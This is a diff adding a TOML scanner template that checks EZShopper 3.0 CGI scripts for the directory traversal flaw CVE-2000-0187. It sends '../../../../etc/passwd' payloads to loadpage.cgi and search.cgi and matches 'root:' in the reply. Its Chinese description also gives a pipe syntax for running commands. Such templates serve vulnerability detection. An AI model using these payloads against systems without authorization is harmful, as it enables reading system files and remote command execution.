@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "检测 EZShopper 3.0 loadpage.cgi 是否存在目录遍历或远程命令执行漏洞。脚本未对 file 参数做任何检查，直接传入 open() 调用。攻击者可通过 file=../../../../etc/passwd 读取任意文件，或通过 file=|command| 执行系统命令。"
+id = "POC-AVE-2000-0606"
+name = "EZShopper 3.0 loadpage.cgi 目录遍历与远程命令执行 PoC"
+severity = "high"
+tags = ["ave-2000-0606"]
+vuln_id = [
+    "CVE-2000-0187",
+    "AVE-2000-0606",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/loadpage.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "user_id=1&file=../../../../etc/passwd"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/search.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "user_id=1&database=../../../../etc/passwd&distinct=1"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
